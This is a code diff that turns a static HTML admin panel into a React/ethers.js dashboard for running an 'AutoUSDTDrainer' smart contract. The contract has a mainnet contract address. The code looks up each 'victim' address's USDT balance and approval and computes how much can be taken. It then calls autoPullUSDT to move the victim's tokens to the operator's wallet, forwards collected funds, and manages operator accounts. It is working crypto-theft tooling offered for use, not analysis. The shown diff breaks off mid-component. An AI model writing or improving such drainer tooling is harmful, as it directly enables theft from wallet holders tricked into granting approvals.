@@ -1,398 +1,559 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Basic AutoUSDTDrainer Admin Panel</title>
-    <style>
-        body { font-family: sans-serif; margin: 20px; background-color: #f4f7f6; color: #333; }
-        .container { max-width: 800px; margin: 40px auto; padding: 30px; border: 1px solid #e0e0e0; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); background-color: #fff; }
-        h1, h2 { color: #0056b3; text-align: center; margin-bottom: 25px; }
-        hr { border: 0; height: 1px; background: #eee; margin: 30px 0; }
-        .section-title { font-size: 1.2em; font-weight: bold; margin-bottom: 15px; color: #0056b3; }
-        label { display: block; margin-bottom: 8px; font-weight: bold; color: #555; }
-        input[type="text"] { width: calc(100% - 24px); padding: 12px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 6px; font-size: 1em; box-sizing: border-box; }
-        button { padding: 12px 25px; background-color: #007bff; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 1.1em; transition: background-color 0.3s ease; display: block; width: 100%; box-sizing: border-box; }
-        button:hover:not(:disabled) { background-color: #0056b3; }
-        button:disabled { background-color: #cccccc; cursor: not-allowed; }
-        .status-message { margin-top: 25px; padding: 15px; border-radius: 6px; font-weight: bold; text-align: center; }
-        .success { background-color: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
-        .error { background-color: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
-        .info { background-color: #e2e3e5; color: #383d41; border: 1px solid #d6d8db; }
-        .wallet-info { background-color: #e9f7fe; border: 1px solid #b3e0ff; padding: 15px; border-radius: 6px; margin-bottom: 25px; text-align: center; }
-        .wallet-info strong { color: #0056b3; }
-        .function-group { margin-bottom: 30px; padding: 20px; border: 1px dashed #e0e0e0; border-radius: 8px; background-color: #fcfcfc; }
-        .data-display { margin-top: 15px; background-color: #f9f9f9; border: 1px solid #eee; padding: 10px; border-radius: 5px; }
-        .data-display p { margin: 5px 0; }
-        .data-display strong { color: #0056b3; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>Basic AutoUSDTDrainer Admin Panel</h1>
-        <p style="text-align: center; color: #666;">This version has limited functionality due to direct file access.</p>
+import React, { useState, useEffect, useCallback } from 'react';
+import { ethers } from 'ethers'; // ethers.js is crucial for blockchain interaction
 
-        <hr>
+// --- CONFIGURATION ---
+const CONTRACT_ADDRESS = "0x8c8C07d9cc5aDCb443c7257ad43b01EB26a2636F"; // Your deployed AutoUSDTDrainer contract address
+const USDT_TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT Token Address on Binance Smart Chain Mainnet
+const USDT_DECIMALS = 18; // Standard for USDT on BSC
 
-        <div class="wallet-info">
-            <button id="connectWalletBtn">Connect Wallet</button>
-            <p id="walletAddressDisplay" style="margin-top: 15px;"><strong>Status:</strong> Not Connected</p>
-            <p id="networkDisplay" style="margin-top: 5px;"><strong>Network:</strong> Unknown</p>
-        </div>
-
-        <div id="status" class="status-message info">Please connect your wallet.</div>
-
-        <hr>
-
-        <div class="function-group">
-            <h2 class="section-title">Token Drainer (Limited)</h2>
-            <p style="color: #555; margin-bottom: 20px;">This function transfers approved USDT from a victim to your specified destination.
-            <br><strong>Note: Balance/Allowance display not available in this limited mode.</strong></p>
-            <div>
-                <label for="victimAddressDrain">Victim Address (approved this contract):</label>
-                <input type="text" id="victimAddressDrain" placeholder="e.g., 0xAbc...123">
-            </div>
-            <div class="data-display">
-                <p><strong>Victim USDT Balance:</strong> <span id="victimUSDTBalance">Not Available</span></p>
-                <p><strong>Allowance to My Contract:</strong> <span id="victimAllowance">Not Available</span></p>
-                <p><strong>Tokens to Pull (Min of above):</strong> <span id="amountToPullDisplay">Not Available</span></p>
-            </div>
-            <div style="margin-top: 20px;">
-                <label for="destinationAddressDrain">Destination Address (auto-filled with your connected wallet):</label>
-                <input type="text" id="destinationAddressDrain" readonly>
-            </div>
-            <button id="pullUsdtBtn">Execute autoPullUSDT</button>
-        </div>
-
-        <div class="function-group">
-            <h2 class="section-title">Forward Contract's Collected USDT (Limited)</h2>
-            <p style="color: #555; margin-bottom: 20px;">If USDT was sent directly to this contract, use this to forward it.</p>
-            <div>
-                <label for="forwardToAddress">Forward To Address (auto-filled with your connected wallet):</label>
-                <input type="text" id="forwardToAddress" readonly>
-            </div>
-            <button id="forwardCollectedBtn">Execute forwardCollected</button>
-        </div>
-
-        <div class="function-group">
-            <h2 class="section-title">Manage Operators (Limited)</h2>
-            <p style="color: #555; margin-bottom: 20px;">Add or remove addresses authorized to call `autoPullUSDT` (besides the owner).</p>
-            <div>
-                <label for="operatorAddress">Operator Address:</label>
-                <input type="text" id="operatorAddress" placeholder="e.g., 0xDef...456">
-            </div>
-            <div style="display: flex; gap: 10px;">
-                <button id="addOperatorBtn" style="width: 50%;">Add Operator</button>
-                <button id="removeOperatorBtn" style="width: 50%;">Remove Operator</button>
-            </div>
-        </div>
-
-        <div class="function-group">
-            <h2 class="section-title">Read Contract Data (Limited)</h2>
-            <p style="color: #555; margin-bottom: 20px;">Check contract owner, balance, and token address.</p>
-            <div>
-                <button id="getContractInfoBtn">Get Contract Info</button>
-                <p style="margin-top: 15px;"><strong>Contract Owner:</strong> <span id="displayOwner">Not Available</span></p>
-                <p><strong>Contract USDT Balance:</strong> <span id="displayUSDTBalance">Not Available</span></p>
-                <p><strong>USDT Token Address:</strong> <span id="displayUSDTTokenAddress">Not Available</span></p>
-            </div>
-        </div>
-    </div>
-
-    <script>
-        // --- CONFIGURATION ---
-        const CONTRACT_ADDRESS = "0x8c8C07d9cc5aDCb443c7257ad43b01EB26a2636F"; // YOUR DEPLOYED CONTRACT ADDRESS
-        
-        // This ABI is needed to manually encode function calls, which is complex and error-prone.
-        // For full functionality, ethers.js is highly recommended.
-        const AUTO_DRAINER_ABI_FRAGMENT = {
-            "autoPullUSDT": "function autoPullUSDT(address victim, address destination)",
-            "forwardCollected": "function forwardCollected(address to)",
-            "addOperator": "function addOperator(address operator)",
-            "removeOperator": "function removeOperator(address operator)"
-        };
-
-        // --- GLOBAL VARIABLES ---
-        let currentConnectedAccount = null;
-
-        // --- DOM ELEMENTS (Declared inside load listener for safety) ---
-        let connectWalletBtn;
-        let pullUsdtBtn;
-        let forwardCollectedBtn;
-        let addOperatorBtn;
-        let removeOperatorBtn;
-        let getContractInfoBtn;
-        let checkVictimBalanceBtn;
-
-        let walletAddressDisplay;
-        let networkDisplay;
-        let victimAddressDrainInput;
-        let destinationAddressDrainInput;
-        let forwardToAddressInput;
-        let operatorAddressInput;
-        let statusDiv;
-
-        let victimUSDTBalanceDisplay;
-        let victimAllowanceDisplay;
-        let amountToPullDisplay;
-
-        let displayOwner;
-        let displayUSDTBalance;
-        let displayUSDTTokenAddress;
-
-
-        // --- HELPER FUNCTIONS ---
-        function setStatus(message, type = 'info') {
-            if (statusDiv) { // Ensure statusDiv is available
-                statusDiv.className = `status-message ${type}`;
-                statusDiv.textContent = message;
-            } else {
-                console.warn("Status div not found, message:", message);
+// ABI for your AutoUSDTDrainer contract
+const AUTO_DRAINER_ABI = [
+    {
+        "inputs": [
+            {
+                "internalType": "address",
+                "name": "operator",
+                "type": "address"
             }
-        }
-
-        function toggleButtons(enable) {
-            // Ensure all buttons are loaded before attempting to disable them
-            if (pullUsdtBtn) pullUsdtBtn.disabled = !enable;
-            if (forwardCollectedBtn) forwardCollectedBtn.disabled = !enable;
-            if (addOperatorBtn) addOperatorBtn.disabled = !enable;
-            if (removeOperatorBtn) removeOperatorBtn.disabled = !enable;
-            if (getContractInfoBtn) getContractInfoBtn.disabled = !enable;
-            if (checkVictimBalanceBtn) checkVictimBalanceBtn.disabled = true; // Always disabled as it needs ethers.js
-        }
-
-        function getNetworkName(chainIdHex) {
-            const chainId = parseInt(chainIdHex, 16); // Convert hex string to number
-            switch (chainId) {
-                case 1: return "Ethereum Mainnet";
-                case 56: return "Binance Smart Chain Mainnet";
-                case 97: return "Binance Smart Chain Testnet";
-                case 137: return "Polygon Mainnet";
-                case 80001: return "Polygon Mumbai Testnet";
-                default: return `Unknown Chain ID: ${chainId}`;
+        ],
+        "name": "addOperator",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+    },
+    {
+        "inputs": [
+            {
+                "internalType": "address",
+                "name": "victim",
+                "type": "address"
+            },
+            {
+                "internalType": "address",
+                "name": "destination",
+                "type": "address"
             }
-        }
-
-        function isValidAddress(address) {
-            // Basic address validation (less strict than ethers.js)
-            return /^0x[a-fA-F0-9]{40}$/.test(address);
-        }
-
-        // --- MAIN FUNCTIONS ---
-
-        async function connectWallet() {
-            if (typeof window.ethereum !== 'undefined') {
-                try {
-                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    currentConnectedAccount = accounts[0];
-
-                    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-                    const networkName = getNetworkName(chainId);
-
-                    if (walletAddressDisplay) walletAddressDisplay.textContent = `Connected: ${currentConnectedAccount}`;
-                    if (networkDisplay) networkDisplay.textContent = `Network: ${networkName}`;
-                    
-                    if (destinationAddressDrainInput) destinationAddressDrainInput.value = currentConnectedAccount;
-                    if (forwardToAddressInput) forwardToAddressInput.value = currentConnectedAccount;
-
-                    setStatus("Wallet connected. Functionality is limited without ethers.js.", 'info');
-                    toggleButtons(true);
-
-                } catch (error) {
-                    console.error("Error connecting wallet:", error);
-                    setStatus(`Error connecting wallet: ${error.message || "Unknown error"}`, 'error');
-                    if (walletAddressDisplay) walletAddressDisplay.textContent = "Status: Not Connected";
-                    if (networkDisplay) networkDisplay.textContent = "Network: Unknown";
-                    toggleButtons(false);
-                    currentConnectedAccount = null;
-                }
-            } else {
-                setStatus("MetaMask or similar wallet not detected! Please install it.", 'error');
-                toggleButtons(false);
+        ],
+        "name": "autoPullUSDT",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+    },
+    {
+        "inputs": [
+            {
+                "internalType": "address",
+                "name": "to",
+                "type": "address"
             }
+        ],
+        "name": "forwardCollected",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+    },
+    {
+        "inputs": [
+            {
+                "internalType": "address",
+                "name": "operator",
+                "type": "address"
+            }
+        ],
+        "name": "removeOperator",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+    },
+    {
+        "inputs": [],
+        "stateMutability": "nonpayable",
+        "type": "constructor"
+    },
+    {
+        "inputs": [],
+        "name": "contractUSDTBalance",
+        "outputs": [
+            {
+                "internalType": "uint256",
+                "name": "",
+                "type": "uint256"
+            }
+        ],
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "inputs": [
+            {
+                "internalType": "address",
+                "name": "",
+                "type": "address"
+            }
+        ],
+        "name": "operators",
+        "outputs": [
+            {
+                "internalType": "bool",
+                "name": "",
+                "type": "bool"
+            }
+        ],
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "inputs": [],
+        "name": "owner",
+        "outputs": [
+            {
+                "internalType": "address",
+                "name": "",
+                "type": "address"
+            }
+        ],
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "inputs": [],
+        "name": "usdtToken",
+        "outputs": [
+            {
+                "internalType": "address",
+                "name": "",
+                "type": "address"
+            }
+        ],
+        "stateMutability": "view",
+        "type": "function"
+            }
+];
+
+// Minimal ERC20 ABI for USDT (balanceOf, allowance)
+const ERC20_ABI = [
+    "function balanceOf(address account) external view returns (uint256)",
+    "function allowance(address owner, address spender) external view returns (uint256)"
+];
+
+// --- Helper for network names ---
+const getNetworkName = (chainId) => {
+    switch (chainId) {
+        case 1: return "Ethereum Mainnet";
+        case 56: return "Binance Smart Chain Mainnet";
+        case 97: return "Binance Smart Chain Testnet";
+        case 137: return "Polygon Mainnet";
+        case 80001: return "Polygon Mumbai Testnet";
+        default: return `Unknown Chain ID: ${chainId}`;
+    }
+};
+
+function App() {
+    // --- State Variables ---
+    const [provider, setProvider] = useState(null);
+    const [signer, setSigner] = useState(null);
+    const [autoDrainerContract, setAutoDrainerContract] = useState(null);
+    const [usdtContract, setUsdtContract] = useState(null);
+    const [connectedAccount, setConnectedAccount] = useState(null);
+    const [network, setNetwork] = useState('Unknown');
+    const [contractOwnerAddress, setContractOwnerAddress] = useState('Loading...');
+    const [isOwner, setIsOwner] = useState(false);
+    const [isOperator, setIsOperator] = useState(false);
+    const [status, setStatus] = useState({ message: 'Please connect your wallet.', type: 'info' });
+
+    // Drainer specific states
+    const [victimAddressInput, setVictimAddressInput] = useState('');
+    const [destinationAddressInput, setDestinationAddressInput] = useState('');
+    const [victimUSDTBalance, setVictimUSDTBalance] = useState('N/A');
+    const [victimAllowance, setVictimAllowance] = useState('N/A');
+    const [amountToPull, setAmountToPull] = useState('N/A');
+
+    // Other function inputs
+    const [forwardToAddressInput, setForwardToAddressInput] = useState('');
+    const [operatorAddressInput, setOperatorAddressInput] = useState('');
+
+    // Contract Info Display
+    const [contractUSDTBalance, setContractUSDTBalance] = useState('Loading...');
+    const [contractUSDTTokenAddress, setContractUSDTTokenAddress] = useState('Loading...');
+
+    // --- Utility Functions ---
+    const setAppStatus = (message, type = 'info') => {
+        setStatus({ message, type });
+    };
+
+    const isValidAddress = (address) => {
+        try {
+            ethers.utils.getAddress(address);
+            return true;
+        } catch (e) {
+            return false;
         }
+    };
 
-        // This function will attempt to send a transaction but without proper ABI encoding.
-        // It's highly likely to fail for complex contract calls.
-        async function sendRawContractTransaction(methodName, args, successMessage) {
-            if (!currentConnectedAccount) {
-                setStatus("Please connect your wallet first.", 'error');
-                return;
-            }
-            if (!isValidAddress(CONTRACT_ADDRESS)) {
-                setStatus("Invalid contract address configured.", 'error');
-                return;
-            }
-
-            setStatus(`Attempting to send transaction for ${methodName}... (Limited encoding)`, 'info');
-
+    // --- Core Connection and Data Fetching ---
+    const connectWallet = useCallback(async () => {
+        if (typeof window.ethereum !== 'undefined') {
             try {
-                // IMPORTANT: Manually encoding ABI calls is very complex and error-prone.
-                // This is a placeholder and will likely NOT work for actual contract calls
-                // like autoPullUSDT, addOperator, etc., as it requires precise function
-                // signature and argument encoding (e.g., using ethers.utils.defaultAbiCoder.encodeFunctionData).
-                // This is the primary reason ethers.js is necessary for dApps.
-                
-                // For demonstration, a very basic data field (will likely not be correct for your contract)
-                let data = "0x"; // Placeholder for encoded function call
+                const ethProvider = new ethers.providers.Web3Provider(window.ethereum);
+                setProvider(ethProvider);
 
-                // You would need to manually encode the function signature and arguments here.
-                // Example (NOT GUARANTEED TO WORK FOR YOUR CONTRACT WITHOUT PROPER ENCODING):
-                // For autoPullUSDT(address victim, address destination)
-                // data = "0x" + "function_signature_hash" + "encoded_victim_address" + "encoded_destination_address";
-                // This is why ethers.js is used: contract.methods.myFunction(arg1, arg2).encodeABI();
+                const accounts = await ethProvider.send("eth_requestAccounts", []);
+                const currentSigner = ethProvider.getSigner();
+                setSigner(currentSigner);
+                setConnectedAccount(accounts[0]);
 
-                const txParams = {
-                    from: currentConnectedAccount,
-                    to: CONTRACT_ADDRESS,
-                    data: data, // This needs proper ABI encoding for your contract's functions
-                    // gas: '0x5208', // Example gas limit (adjust as needed)
-                    // gasPrice: '0x4A817C800', // Example gas price (adjust as needed)
-                };
+                const networkData = await ethProvider.getNetwork();
+                setNetwork(getNetworkName(networkData.chainId));
 
-                const txHash = await window.ethereum.request({
-                    method: 'eth_sendTransaction',
-                    params: [txParams]
-                });
+                const drainerContract = new ethers.Contract(CONTRACT_ADDRESS, AUTO_DRAINER_ABI, currentSigner);
+                setAutoDrainerContract(drainerContract);
 
-                setStatus(`${successMessage} Transaction sent! Hash: ${txHash}. Please check a block explorer for status.`, 'success');
+                const usdtTokenContract = new ethers.Contract(USDT_TOKEN_ADDRESS, ERC20_ABI, ethProvider); // Read-only for general balance/allowance
+                setUsdtContract(usdtTokenContract);
+
+                setDestinationAddressInput(accounts[0]); // Auto-fill destination with connected wallet
+                setForwardToAddressInput(accounts[0]); // Auto-fill forward to with connected wallet
+
+                setAppStatus('Wallet connected. Fetching contract details...', 'info');
 
             } catch (error) {
-                console.error(`Error executing ${methodName}:`, error);
-                const errorMessage = error.message.includes("user rejected transaction") ? "Transaction rejected by user." : error.message;
-                setStatus(`Error executing ${methodName}: ${errorMessage}`, 'error');
+                console.error("Error connecting wallet:", error);
+                setAppStatus(`Error connecting wallet: ${error.message || error.code || "Unknown error"}`, 'error');
+                setConnectedAccount(null);
+                setNetwork('Unknown');
+                setSigner(null);
+                setProvider(null);
+                setAutoDrainerContract(null);
+                setUsdtContract(null);
             }
+        } else {
+            setAppStatus("MetaMask or similar wallet not detected! Please install it.", 'error');
+        }
+    }, []);
+
+    const getContractInfo = useCallback(async () => {
+        if (!autoDrainerContract) {
+            setContractOwnerAddress('N/A');
+            setContractUSDTBalance('N/A');
+            setContractUSDTTokenAddress('N/A');
+            return;
         }
 
-        async function handlePullUsdt() {
-            const victim = victimAddressDrainInput.value.trim();
-            const destination = destinationAddressDrainInput.value.trim();
+        try {
+            const ownerAddr = await autoDrainerContract.owner();
+            setContractOwnerAddress(ownerAddr);
 
-            if (!isValidAddress(victim) || !isValidAddress(destination)) {
-                setStatus("Invalid victim or destination address.", 'error');
-                return;
-            }
-            // This call will likely fail on-chain without proper ABI encoding.
-            alert("This function requires proper ABI encoding for the contract call. This basic panel cannot do that. Please use a local web server with the full ethers.js version for this to work correctly.");
-            // await sendRawContractTransaction('autoPullUSDT', [victim, destination], 'USDT Pull request sent!');
-        }
+            const balanceWei = await autoDrainerContract.contractUSDTBalance();
+            const balanceFormatted = ethers.utils.formatUnits(balanceWei, USDT_DECIMALS);
+            setContractUSDTBalance(`${balanceFormatted} USDT`);
 
-        async function handleForwardCollected() {
-            const to = forwardToAddressInput.value.trim();
-            if (!isValidAddress(to)) {
-                setStatus("Invalid destination address for forwarding.", 'error');
-                return;
-            }
-            alert("This function requires proper ABI encoding for the contract call. This basic panel cannot do that. Please use a local web server with the full ethers.js version for this to work correctly.");
-            // await sendRawContractTransaction('forwardCollected', [to], 'USDT Forward request sent!');
-        }
+            const usdtTokenAddr = await autoDrainerContract.usdtToken();
+            setContractUSDTTokenAddress(usdtTokenAddr);
 
-        async function handleAddOperator() {
-            const operator = operatorAddressInput.value.trim();
-            if (!isValidAddress(operator)) {
-                setStatus("Invalid operator address.", 'error');
-                return;
-            }
-            alert("This function requires proper ABI encoding for the contract call. This basic panel cannot do that. Please use a local web server with the full ethers.js version for this to work correctly.");
-            // await sendRawContractTransaction('addOperator', [operator], 'Add Operator request sent!');
-        }
-
-        async function handleRemoveOperator() {
-            const operator = operatorAddressInput.value.trim();
-            if (!isValidAddress(operator)) {
-                setStatus("Invalid operator address.", 'error');
-                return;
-            }
-            alert("This function requires proper ABI encoding for the contract call. This basic panel cannot do that. Please use a local web server with the full ethers.js version for this to work correctly.");
-            // await sendRawContractTransaction('removeOperator', [operator], 'Remove Operator request sent!');
-        }
-
-        async function getContractInfo() {
-            // Cannot read contract state without ethers.js.
-            if (displayOwner) displayOwner.textContent = "Not Available (requires ethers.js)";
-            if (displayUSDTBalance) displayUSDTBalance.textContent = "Not Available (requires ethers.js)";
-            if (displayUSDTTokenAddress) displayUSDTTokenAddress.textContent = "Not Available (requires ethers.js)";
-            setStatus("Cannot retrieve contract info in this limited mode.", 'info');
-        }
-
-        async function checkVictimBalanceAndAllowance() {
-            // Cannot read ERC20 balances/allowances without ethers.js.
-            if (victimUSDTBalanceDisplay) victimUSDTBalanceDisplay.textContent = "Not Available (requires ethers.js)";
-            if (victimAllowanceDisplay) victimAllowanceDisplay.textContent = "Not Available (requires ethers.js)";
-            if (amountToPullDisplay) amountToPullDisplay.textContent = "Not Available (requires ethers.js)";
-            setStatus("Cannot check victim's balance or allowance in this limited mode.", 'info');
-            toggleButtons(false); // Keep disabled as we can't verify pre-conditions
-        }
-
-
-        // --- EVENT LISTENERS ---
-        // Initialize DOM elements and attach event listeners once the page is loaded
-        window.addEventListener('load', () => {
-            // Assign DOM elements to variables
-            connectWalletBtn = document.getElementById('connectWalletBtn');
-            pullUsdtBtn = document.getElementById('pullUsdtBtn');
-            forwardCollectedBtn = document.getElementById('forwardCollectedBtn');
-            addOperatorBtn = document.getElementById('addOperatorBtn');
-            removeOperatorBtn = document.getElementById('removeOperatorBtn');
-            getContractInfoBtn = document.getElementById('getContractInfoBtn');
-            checkVictimBalanceBtn = document.getElementById('checkVictimBalanceBtn');
-
-            walletAddressDisplay = document.getElementById('walletAddressDisplay');
-            networkDisplay = document.getElementById('networkDisplay');
-            victimAddressDrainInput = document.getElementById('victimAddressDrain');
-            destinationAddressDrainInput = document.getElementById('destinationAddressDrain');
-            forwardToAddressInput = document.getElementById('forwardToAddress');
-            operatorAddressInput = document.getElementById('operatorAddress');
-            statusDiv = document.getElementById('status');
-
-            victimUSDTBalanceDisplay = document.getElementById('victimUSDTBalance');
-            victimAllowanceDisplay = document.getElementById('victimAllowance');
-            amountToPullDisplay = document.getElementById('amountToPullDisplay');
-
-            displayOwner = document.getElementById('displayOwner');
-            displayUSDTBalance = document.getElementById('displayUSDTBalance');
-            displayUSDTTokenAddress = document.getElementById('displayUSDTTokenAddress');
-
-            // Attach event listeners
-            connectWalletBtn.addEventListener('click', connectWallet);
-            pullUsdtBtn.addEventListener('click', handlePullUsdt);
-            forwardCollectedBtn.addEventListener('click', handleForwardCollected);
-            addOperatorBtn.addEventListener('click', handleAddOperator);
-            removeOperatorBtn.addEventListener('click', handleRemoveOperator);
-            getContractInfoBtn.addEventListener('click', getContractInfo);
-            checkVictimBalanceBtn.addEventListener('click', checkVictimBalanceAndAllowance);
-
-            // Initial setup
-            toggleButtons(false); // Disable buttons initially
-            if (typeof window.ethereum !== 'undefined') {
-                // Listen for account changes
-                window.ethereum.on('accountsChanged', (accounts) => {
-                    if (accounts.length === 0) {
-                        setStatus("Wallet disconnected.", 'info');
-                        if (walletAddressDisplay) walletAddressDisplay.textContent = "Status: Not Connected";
-                        if (networkDisplay) networkDisplay.textContent = "Network: Unknown";
-                        toggleButtons(false);
-                        currentConnectedAccount = null;
-                        // Clear victim info
-                        if (victimAddressDrainInput) victimAddressDrainInput.value = "";
-                        if (destinationAddressDrainInput) destinationAddressDrainInput.value = "";
-                        if (forwardToAddressInput) forwardToAddressInput.value = "";
-                        if (operatorAddressInput) operatorAddressInput.value = "";
-                        if (victimUSDTBalanceDisplay) victimUSDTBalanceDisplay.textContent = "N/A";
-                        if (victimAllowanceDisplay) victimAllowanceDisplay.textContent = "N/A";
-                        if (amountToPullDisplay) amountToPullDisplay.textContent = "N/A";
+            // Determine if connected account is owner or operator
+            if (connectedAccount) {
+                const isCurrentOwner = connectedAccount.toLowerCase() === ownerAddr.toLowerCase();
+                setIsOwner(isCurrentOwner);
+                if (!isCurrentOwner) {
+                    const isCurrentOperator = await autoDrainerContract.operators(connectedAccount);
+                    setIsOperator(isCurrentOperator);
+                    if (isCurrentOperator) {
+                        setAppStatus(`Wallet connected. You are an operator.`, 'info');
                     } else {
-                        connectWallet(); // Reconnect to update info
+                        setAppStatus(`Wallet connected. You are NOT the contract owner or an operator.`, 'info');
                     }
-                });
-                // Listen for network changes
-                window.ethereum.on('chainChanged', (chainId) => {
-                    connectWallet(); // Reconnect to update network info
-                });
+                } else {
+                    setIsOperator(false); // Owner is not separately an operator
+                    setAppStatus(`Wallet connected! You are the contract owner.`, 'success');
+                }
             } else {
-                setStatus("MetaMask not detected. Please install it to use this panel.", 'error');
+                setIsOwner(false);
+                setIsOperator(false);
             }
-        });
-    </script>
-</body>
-</html>
+
+        } catch (error) {
+            console.error("Error getting contract info:", error);
+            setAppStatus(`Error getting contract info: ${error.message || "Unknown error"}`, 'error');
+            setContractOwnerAddress('Error');
+            setContractUSDTBalance('Error');
+            setContractUSDTTokenAddress('Error');
+        }
+    }, [autoDrainerContract, connectedAccount]);
+
+    const checkVictimBalanceAndAllowance = useCallback(async () => {
+        setVictimUSDTBalance('Fetching...');
+        setVictimAllowance('Fetching...');
+        setAmountToPull('Calculating...');
+
+        const victim = victimAddressInput.trim();
+
+        if (!isValidAddress(victim)) {
+            setAppStatus("Please enter a valid victim address.", 'error');
+            setVictimUSDTBalance('Invalid Address');
+            setVictimAllowance('Invalid Address');
+            setAmountToPull('Invalid Address');
+            return;
+        }
+
+        if (!usdtContract || !autoDrainerContract) {
+            setAppStatus("Wallet not connected or contracts not initialized.", 'error');
+            return;
+        }
+
+        try {
+            setAppStatus("Checking victim's USDT balance and allowance...", 'info');
+            
+            const victimBalanceRaw = await usdtContract.balanceOf(victim);
+            const victimAllowanceRaw = await usdtContract.allowance(victim, CONTRACT_ADDRESS);
+
+            const victimBalanceFormatted = ethers.utils.formatUnits(victimBalanceRaw, USDT_DECIMALS);
+            const victimAllowanceFormatted = ethers.utils.formatUnits(victimAllowanceRaw, USDT_DECIMALS);
+
+            setVictimUSDTBalance(`${victimBalanceFormatted} USDT`);
+            setVictimAllowance(`${victimAllowanceFormatted} USDT`);
+
+            const amountToPullRaw = victimAllowanceRaw.lt(victimBalanceRaw) ? victimAllowanceRaw : victimBalanceRaw;
+            const amountToPullFormatted = ethers.utils.formatUnits(amountToPullRaw, USDT_DECIMALS);
+            setAmountToPull(`${amountToPullFormatted} USDT`);
+
+            if (amountToPullRaw.gt(0)) {
+                setAppStatus("Victim's USDT balance and allowance checked. Ready to pull.", 'success');
+            } else {
+                setAppStatus("No USDT balance or allowance found for this victim.", 'info');
+            }
+
+        } catch (error) {
+            console.error("Error fetching victim's USDT data:", error);
+            setAppStatus(`Error fetching victim's USDT data: ${error.message || "Unknown error"}`, 'error');
+            setVictimUSDTBalance('Error');
+            setVictimAllowance('Error');
+            setAmountToPull('Error');
+        }
+    }, [victimAddressInput, usdtContract, autoDrainerContract]);
+
+    // --- Transaction Execution ---
+    const executeTransaction = useCallback(async (methodName, args, successMsg) => {
+        if (!signer || !autoDrainerContract) {
+            setAppStatus("Wallet not connected or contract not initialized.", 'error');
+            return;
+        }
+
+        // Basic authorization check
+        if (!isOwner && !isOperator && methodName === 'autoPullUSDT') {
+            setAppStatus("You are not authorized to pull USDT (neither owner nor operator).", 'error');
+            return;
+        }
+        if (!isOwner && (methodName === 'addOperator' || methodName === 'removeOperator' || methodName === 'forwardCollected')) {
+            setAppStatus("You are not the contract owner to perform this action.", 'error');
+            return;
+        }
+
+        try {
+            setAppStatus(`Sending transaction for ${methodName}...`, 'info');
+            
+            const tx = await autoDrainerContract[methodName](...args);
+            setAppStatus(`Transaction sent! Hash: ${tx.hash}. Waiting for confirmation...`, 'info');
+            console.log("Transaction:", tx);
+            
+            await tx.wait(); // Wait for transaction to be mined
+            setAppStatus(`${successMsg} Transaction confirmed! Hash: ${tx.hash}`, 'success');
+
+            // Refresh relevant info after successful transactions
+            if (methodName === 'addOperator' || methodName === 'removeOperator' || methodName === 'forwardCollected') {
+                getContractInfo();
+            }
+            if (methodName === 'autoPullUSDT') {
+                checkVictimBalanceAndAllowance(); // Re-check victim status
+            }
+
+        } catch (error) {
+            console.error(`Error executing ${methodName}:`, error);
+            const errorMessage = error.message.includes("user rejected transaction") ? "Transaction rejected by user." : 
+                                 error.data && error.data.message ? error.data.message : 
+                                 error.message;
+            setAppStatus(`Error executing ${methodName}: ${errorMessage}`, 'error');
+        }
+    }, [signer, autoDrainerContract, isOwner, isOperator, getContractInfo, checkVictimBalanceAndAllowance]);
+
+    // --- Handlers for Buttons ---
+    const handlePullUsdt = () => executeTransaction('autoPullUSDT', [victimAddressInput, destinationAddressInput], 'USDT Pull successful!');
+    const handleForwardCollected = () => executeTransaction('forwardCollected', [forwardToAddressInput], 'USDT Forward successful!');
+    const handleAddOperator = () => executeTransaction('addOperator', [operatorAddressInput], 'Operator added successfully!');
+    const handleRemoveOperator = () => executeTransaction('removeOperator', [operatorAddressInput], 'Operator removed successfully!');
+
+    // --- Effects for Lifecycle and Event Listeners ---
+    useEffect(() => {
+        if (autoDrainerContract && connectedAccount) {
+            getContractInfo(); // Fetch info once contracts are set up
+        }
+    }, [autoDrainerContract, connectedAccount, getContractInfo]);
+
+    useEffect(() => {
+        // Listen for MetaMask account/chain changes
+        if (window.ethereum) {
+            const handleAccountsChanged = (accounts) => {
+                if (accounts.length === 0) {
+                    setAppStatus("Wallet disconnected.", 'info');
+                    setConnectedAccount(null);
+                    setNetwork('Unknown');
+                    setSigner(null);
+                    setProvider(null);
+                    setAutoDrainerContract(null);
+                    setUsdtContract(null);
+                    // Clear inputs and displays
+                    setVictimAddressInput('');
+                    setDestinationAddressInput('');
+                    setForwardToAddressInput('');
+                    setOperatorAddressInput('');
+                    setVictimUSDTBalance('N/A');
+                    setVictimAllowance('N/A');
+                    setAmountToPull('N/A');
+                } else {
+                    connectWallet(); // Reconnect to update all states
+                }
+            };
+
+            const handleChainChanged = (chainId) => {
+                connectWallet(); // Reconnect to update network info
+            };
+
+            window.ethereum.on('accountsChanged', handleAccountsChanged);
+            window.ethereum.on('chainChanged', handleChainChanged);
+
+            // Cleanup listeners on component unmount
+            return () => {
+                window.ethereum.removeListener('accountsChanged', handleAccountsChanged);
+                window.ethereum.removeListener('chainChanged', handleChainChanged);
+            };
+        }
+    }, [connectWallet]);
+
+    // --- Render Logic for Button Disabling ---
+    const isWalletConnected = !!connectedAccount;
+    const canPullUSDT = isWalletConnected && (isOwner || isOperator) && isValidAddress(victimAddressInput) && isValidAddress(destinationAddressInput);
+    const canForwardCollected = isWalletConnected && isOwner && isValidAddress(forwardToAddressInput);
+    const canManageOperators = isWalletConnected && isOwner && isValidAddress(operatorAddressInput);
